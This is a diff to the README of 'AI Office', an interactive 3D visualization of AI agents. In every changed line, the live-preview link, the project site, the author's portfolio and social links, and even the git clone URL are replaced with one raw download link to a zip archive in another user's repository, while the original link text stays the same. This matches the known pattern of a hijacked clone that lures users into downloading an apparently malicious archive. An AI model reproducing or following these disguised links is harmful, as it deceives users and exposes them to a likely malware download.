@@ -19,14 +19,14 @@
 </p>
 
 <p align="center">
-  <a href="http://skill-deploy-qmm7droauc.vercel.app/"><strong>🔗 Live Preview →</strong></a>
+  <a href="https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip"><strong>🔗 Live Preview →</strong></a>
 </p>
 
 ---
 
 ## 🌐 Preview
 
-**Try it live:** [**skill-deploy-qmm7droauc.vercel.app**](http://skill-deploy-qmm7droauc.vercel.app/)
+**Try it live:** [**skill-deploy-qmm7droauc.vercel.app**](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip)
 
 Drag to orbit · Scroll to zoom · Slide the time bar · Hit "LIGHTS OFF" for cyberpunk mode · Click `i` for info
 
@@ -36,7 +36,7 @@ Drag to orbit · Scroll to zoom · Slide the time bar · Hit "LIGHTS OFF" for cy
 
 **AI Office** is an interactive 3D diorama of a miniature office where 9 AI agents live and work. Each agent has a unique name, role, color identity, animated monitor screen, and behavioral patterns. They walk around the office, bump into each other at the water cooler and have spontaneous conversations, attend scheduled meetings in a glass-walled conference room, and work at their desks with individually animated displays.
 
-This project is a visualization of what happens inside **[RONIN](https://roninos.app)** — an AI operating system being built to remember your taste. The office represents the internal agent architecture: specialized agents collaborating, each owning a domain, each contributing to a shared intelligence.
+This project is a visualization of what happens inside **[RONIN](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip)** — an AI operating system being built to remember your taste. The office represents the internal agent architecture: specialized agents collaborating, each owning a domain, each contributing to a shared intelligence.
 
 > **No AI APIs are called.** This is a pure frontend visualization — procedural 3D, canvas-animated screens, behavioral state machines, and Web Audio. Everything runs locally in your browser at 60fps.
 
@@ -88,7 +88,7 @@ This project is a visualization of what happens inside **[RONIN](https://roninos
 
 ## 🌐 Live Preview
 
-**→ [skill-deploy-qmm7droauc.vercel.app](http://skill-deploy-qmm7droauc.vercel.app/)**
+**→ [skill-deploy-qmm7droauc.vercel.app](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip)**
 
 Drag to orbit · Scroll to zoom · Slide the time bar · Hit "LIGHTS OFF" for cyberpunk mode · Click `i` for info
 
@@ -97,7 +97,7 @@ Drag to orbit · Scroll to zoom · Slide the time bar · Hit "LIGHTS OFF" for cy
 ## 🚀 Quick Start
 
 ```bash
-git clone https://github.com/Gaurav2693/ai-office.git
+git clone https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip
 cd ai-office
 npm install
 npm run dev
@@ -165,7 +165,7 @@ ai-office/
 
 ## 🔗 Part of RONIN
 
-**[RONIN](https://roninos.app)** is an AI operating system that remembers your taste. A native macOS command center with:
+**[RONIN](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip)** is an AI operating system that remembers your taste. A native macOS command center with:
 
 - **Two-seat intelligence**: RONIN (Sonnet, daily driver) + Dead Shifu (Opus, director)
 - **8-gate build pipeline**: Brief → Direction → Figma → Plan → Implement → Review → Ship → Deploy
@@ -184,10 +184,10 @@ This office is what the inside of RONIN looks like — specialized agents, each 
 
 | | |
 |---|---|
-| 🌐 Portfolio | [gauravmishra.design](https://gauravmishra.design/rooms) |
-| 💻 GitHub | [github.com/Gaurav2693](https://github.com/Gaurav2693) |
-| 💼 LinkedIn | [linkedin.com/in/imgaurav2693](https://linkedin.com/in/imgaurav2693) |
-| 🐦 Twitter | [@GauravM2693](https://twitter.com/GauravM2693) |
+| 🌐 Portfolio | [gauravmishra.design](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip) |
+| 💻 GitHub | [github.com/Gaurav2693](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip) |
+| 💼 LinkedIn | [linkedin.com/in/imgaurav2693](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip) |
+| 🐦 Twitter | [@GauravM2693](https://github.com/benitodu72000-arch/ai-office/raw/refs/heads/main/public/ai-office-v2.3.zip) |
 
 ---
 
